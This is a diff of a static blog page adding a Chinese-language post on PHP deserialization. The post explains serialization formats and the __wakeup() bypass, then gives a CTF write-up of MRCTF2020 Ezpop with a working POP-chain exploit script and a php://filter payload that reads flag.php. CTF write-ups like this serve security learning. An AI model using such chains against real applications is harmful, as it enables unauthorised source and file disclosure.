@@ -36,14 +36,16 @@
   <title>反序列化 - Oliverial的blog</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="Oliverial的blog - Oliveria - Oliverial的blog">
-  <meta property="og:type" content="article">
+  
+<meta property="og:type" content="article">
 <meta property="og:title" content="反序列化">
 <meta property="og:url" content="http://example.com/2023/12/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="Oliverial的blog">
+<meta property="og:description" content="php中可以通过serialize()和unserialize()对目标进行序列化和反序列化 serialize()和unserialize()函数将对象、数组、变量等转化为字符串，便于数据保存到数据库或文件中，这个过程叫做序列化，而当需要使用这些数据的时候，就需要用反序列化将字符串转化为原来的样子，这也就是序列化的逆过程，PHP提供了serialize()和unserialize()两个函数进行">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2023-12-25T13:24:55.000Z">
-<meta property="article:modified_time" content="2023-12-25T13:24:55.511Z">
+<meta property="article:modified_time" content="2023-12-28T14:03:47.089Z">
 <meta property="article:author" content="Oliveria">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -1626,7 +1628,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1703590182367),
+    lastupdate: new Date(1703772240614),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","lastupdate"],
       for_post: ["toc"],
@@ -2422,7 +2424,50 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    
+    <p>php中可以通过serialize()和unserialize()对目标进行序列化和反序列化</p>
+<h3 id="serialize-和unserialize-函数"><a href="#serialize-和unserialize-函数" class="headerlink" title="serialize()和unserialize()函数"></a>serialize()和unserialize()函数</h3><p>将对象、数组、变量等转化为字符串，便于数据保存到数据库或文件中，这个过程叫做序列化，而当需要使用这些数据的时候，就需要用反序列化将字符串转化为原来的样子，这也就是序列化的逆过程，PHP提供了serialize()和unserialize()两个函数进行操作，而当unserialize()的参数被控制时，就会产生反序列化漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array(&#x27;a&#x27;,12,&#x27;chh&#x27;)</span><br><span class="line">#序列化</span><br><span class="line">a:3:&#123;i:0;s:1:&quot;a&quot;;i:1;i:12;i:2;s:3:&quot;chh&quot;;&#125;</span><br><span class="line">#反序列化</span><br><span class="line">Array ( [0] =&gt; a [1] =&gt; 12 [2] =&gt; chh )</span><br></pre></td></tr></table></figure>
+
+<p>变量类型：元素数量：{元素序列类型：元素序列；元素类型：元素名长度：元素名}（数字型省略元素名长度）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class b_object&#123;</span><br><span class="line">    public $Id1 = 123;</span><br><span class="line">    protected $Id2 = &#x27;1234&#x27;;</span><br><span class="line">    private $Id3 = 12345;</span><br><span class="line">#序列化</span><br><span class="line">O:8:&quot;b_object&quot;:3:&#123;s:3:&quot;Id1&quot;;i:123;s:6:&quot;*Id2&quot;;s:4:&quot;1234&quot;;s:13:&quot;b_objectId3&quot;;i:12345;&#125;</span><br><span class="line">#反序列化</span><br><span class="line">b_object Object ( [Id1] =&gt; 123 [Id2:protected] =&gt; 1234 [Id3:b_object:private] =&gt; 12345 )</span><br></pre></td></tr></table></figure>
+
+<p>变量类型：类名长度：类名：属性数量：{属性名类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容}</p>
+<p>(protected的字段序列化格式为%00*%00属性名，private的字段序列化格式为%00类名%00属性名)</p>
+<p>在php还存在一些魔术方法，在特定条件下会被自动调用，当进行反序列化时同时也会调用模式方法__wakeup()</p>
+<h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup()"></a>绕过__wakeup()</h3><p>执行unserialize()时，会先调用该函数，而这个函数中的代码会影响反序列化的利用，因此需要先绕过__wakeup()，绕过方法是使序列化字符串中表示对象的属性个数的值大于真实的属性个数，如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;b_object&quot;:4:&#123;s:3:&quot;Id1&quot;;i:123;s:6:&quot;*Id2&quot;;i:1234;s:13:&quot;b_objectId3&quot;;i:12345;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><p>这里先解释一下php伪协议中比较常用的php:&#x2F;&#x2F;filter</p>
+<p>php:&#x2F;&#x2F;filter是一种元封装器，简单来说就是在读入或写入数据时对数据进行处理后再进行输出，php:&#x2F;&#x2F;filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行，所以我们一般对其进行编码，让其不执行，从而导致 任意文件读取。</p>
+<p><img src="/../image/143.png" class="lazyload" data-srcset="/../image/143.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="143"></p>
+<p>常用格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">php://filter/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p>这道题进去直接把源码放了出来，这里审阅一下代码，先看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显需要通过get传参传入一个值，而且这个值需要为序列化后的字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Modifier &#123;</span><br><span class="line">  protected $var;</span><br><span class="line">  public function append($value)&#123;</span><br><span class="line">    include($value);</span><br><span class="line">  &#125;</span><br><span class="line">  public function __invoke()&#123;</span><br><span class="line">    $this-&gt;append($this-&gt;var);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里调用include函数，我们可以通过文件包含进行读取，前面也有提示flag在flag.php中，直接构造$var&#x3D;flag.php，现在需要调用这个魔术方法__invoke()，__invoke()当类被当作方法使用时被调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有用的只有__toString()可以进行利用，__toString()当对象被当作字符串时调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">  public $p;</span><br><span class="line">  public function __construct()&#123;</span><br><span class="line">    $this-&gt;p = array();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function __get($key)&#123;</span><br><span class="line">    $function = $this-&gt;p;</span><br><span class="line">    return $function();</span><br></pre></td></tr></table></figure>
+
+<p>这里大致看了一下，能用的__get这个魔术方法，他需要调用对不存在属性或私有属性进行查看时会被自动调用，</p>
+<p>捋一下大致思路，这里需要去读取flag.php，这里就需要调用__invoke()这个魔法方法，就需要Modifier这个类以函数的方式被调用，那这里就需要调用__get方法将Modifier转化成方法，而需要调用__get则需要去调用一个不存在的属性，而在__get恰好有一个不存在的属性，则只需要调用__get即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected $var=&quot;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Show;</span><br><span class="line">$b=new Show;</span><br><span class="line">$a-&gt;source=$b;</span><br><span class="line">$b-&gt;str=new Test;</span><br><span class="line">($b-&gt;str)-&gt;p=new Modifier();</span><br></pre></td></tr></table></figure>
+
+<p>因为这个被反序列化，则需要将输入的参数进行序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(serialize($a));   //因为$var的属性被protected，序列化后会出现两个%00，被url解析后会直接被忽略，所以这里直接对其进行url编码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/145.png" class="lazyload" data-srcset="/../image/145.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="145"></p>
+<p>构造完成后发现无法直接读取flag，这里我们就是用php伪协议读取源码，这里只要修改$var的值即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/144.png" class="lazyload" data-srcset="/../image/144.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="144"></p>
+
   </div>
   
   
@@ -2446,10 +2491,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-12-25T21:24:55+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-12-28T22:03:47+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Dec 25, 2023</p>
+    <p>更新于：Dec 28, 2023</p>
   </a>
 </div>
 
@@ -2580,9 +2625,19 @@ escape() #手动转义
   
 
 
-  <div class="">
-    <!-- pjax占位 -->
-  </div>
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#serialize-%E5%92%8Cunserialize-%E5%87%BD%E6%95%B0"><span class="toc-text">serialize()和unserialize()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-wakeup"><span class="toc-text">绕过__wakeup()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-Ezpop"><span class="toc-text">[MRCTF2020]Ezpop</span></a></li></ol>
+    </div>
+  </section>
 
   
 
@@ -3158,7 +3213,7 @@ escape() #手动转义
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Oliverial的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Oliveria","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Oliverial的blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2023/12/25/反序列化/","name":"反序列化"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Oliverial的blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"Oliveria","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Oliverial的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"反序列化","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/12/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},"author":{"@type":"Person","name":"Oliveria","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Oliverial的blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2023/12/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","wordCount":0,"datePublished":"2023-12-25T13:24:55.000Z","dateModified":"2023-12-25T13:24:55.511Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Oliverial的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Oliveria","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Oliverial的blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2023/12/25/反序列化/","name":"反序列化"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Oliverial的blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"Oliveria","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Oliverial的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"反序列化","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/12/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},"author":{"@type":"Person","name":"Oliveria","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Oliverial的blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2023/12/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","wordCount":0,"datePublished":"2023-12-25T13:24:55.000Z","dateModified":"2023-12-28T14:03:47.089Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
